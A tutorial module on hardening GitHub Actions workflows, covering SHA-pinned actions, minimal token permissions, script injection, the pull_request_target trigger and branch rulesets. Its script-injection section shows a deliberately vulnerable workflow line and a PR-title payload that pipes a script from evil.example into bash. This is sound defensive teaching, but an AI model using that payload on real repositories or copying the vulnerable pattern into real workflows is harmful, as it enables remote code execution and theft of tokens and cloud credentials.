---
title: Hardening the workflows
description: SHA pinning, token minimisation, script injection, dangerous triggers, and branch protection.
---

# Hardening the workflows

The pipeline works. This module's question is: what does it cost an attacker to abuse it, and how do we raise that price at every layer?

![Defense in depth: branch protection, CI checks, workflow hardening, identity, and Azure RBAC, each wrapping the production environment](/img/diagrams/security-layers.svg)

The diagram is the module's map. Module 5 already built layers 4 and 5 (short-lived identity, scoped RBAC). This page builds layers 1 and 3; the next page builds layer 2 and extends the defense to state and drift.

## Pin actions to commit SHAs

Every `uses:` line runs someone else's code inside your job, with your job's permissions and secrets. `actions/checkout@v7` names a Git **tag**, and tags are mutable: whoever controls (or compromises) that repository can move the tag to malicious code, and every workflow referencing it runs the new payload on its next trigger. This is not hypothetical; supply-chain attacks on popular actions have worked exactly this way.

GitHub's security documentation is blunt: pinning to a **full-length commit SHA** is currently the only way to use an action as an immutable release. So production workflows write:

```yaml
      - name: Check out the repository
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1
```

The comment preserves human readability; the SHA is what executes. To resolve a tag yourself, look at the tag in the action's repository, or ask the API:

```bash
# Prints the commit SHA a tag points to (dereferencing annotated tags)
gh api repos/actions/checkout/git/ref/tags/v7.0.1 --jq '.object.sha'
```

Two operational notes. Dependabot can keep pinned SHAs updated with pull requests (each bump arrives as a reviewable diff, which is the point), but be aware it does **not** create security alerts for actions pinned to SHAs, so subscribe to the actions' releases or let Dependabot's version bumps carry the news. And organisations can enforce all of this centrally: repository and organisation policies can restrict which actions may run at all (GitHub-authored only, verified creators, or an explicit allow-list) and can require SHA pinning.

## Minimise GITHUB_TOKEN

You have written `permissions:` since Module 2; here is the full picture. Every job receives a `GITHUB_TOKEN` scoped to the repository. Its default powers depend on repository settings, and the modern default is already read-only for contents and packages. Do not rely on defaults; declare intent:

```yaml
permissions:
  id-token: write
  contents: read
```

The rule that makes this safe: specifying **any** permission sets every unspecified one to `none`. A workflow that needs nothing can say `permissions: {}`. The apply workflow needs exactly the two lines above; nothing in this course ever needs `contents: write`.

## Script injection, the attack you almost shipped

Recall the habit from Module 2: expression values pass through `env:`, never directly into scripts. Here is the attack that habit prevents. Suppose a workflow logged PR titles like this:

```yaml
      # VULNERABLE. Do not write this.
      - run: echo "New PR: ${{ github.event.pull_request.title }}"
```

Expressions are substituted into the script **text** before the shell sees it. An attacker opens a PR titled:

```text
a"; curl -s https://evil.example/x.sh | bash; echo "
```

and your runner executes their script with your job's token, and, in a workflow with `id-token: write`, the ability to mint your cloud identity. The fix costs one line:

```yaml
      - env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: echo "New PR: $PR_TITLE"
```

The value now arrives as data in an environment variable, not as code. Treat every context value an outsider can influence (titles, branch names, commit messages, usernames) as hostile input. GitHub's CodeQL can scan workflows for these patterns automatically.

## The trigger that bypasses everything

`pull_request` runs from forks get no secrets and a read-only token; that is why your pipeline can safely plan strangers' PRs. Its sibling **`pull_request_target`** exists for automation that needs write powers on PR events, and it is dangerous: it runs with the **base repository's** secrets and token. Combine it with checking out the PR's code and you have handed your secrets to arbitrary code from the internet. The documented rule: never explicitly check out untrusted PR code in a privileged workflow. Recent tooling backs this up; `actions/checkout` v7 refuses to check out fork-PR code under `pull_request_target` unless explicitly overridden. Nothing in this course needs the trigger; if a future need arises, treat it as a security review, not a YAML edit.

## Branch protection: close the side door

The apply workflow triggers on push to `main`. Today, nothing stops a direct push that skips the pull request, the plan, and the review. GitHub **rulesets** (Settings, then Rules, then Rulesets) fix that. Create one targeting the default branch requiring:

- **A pull request before merging**, with at least one approval.
- **Status checks to pass**, selecting the `plan` job, so nothing merges with a failing or missing plan.
- **No force pushes, no deletions** (on by default in rulesets).

With the ruleset active, the only path to `main` is exactly the pipeline's front door: PR, green plan, review, merge, gate, apply. (On free plans, enforcement on private repositories requires a paid tier; public repositories get it free, consistent with this course's choices.)

## Two switches to flip while you are in Settings

Under Code security: enable **secret scanning** and **push protection** if they are not already on (public repositories get both free). Secret scanning finds credential-shaped strings in your repository and alerts; push protection refuses the push before the secret lands in history. Your pipeline stores no cloud credentials, so any hit is either a mistake about to be prevented or a colleague's pattern worth fixing; both are wins.

Next: making the code itself prove its quality, and watching for drift.
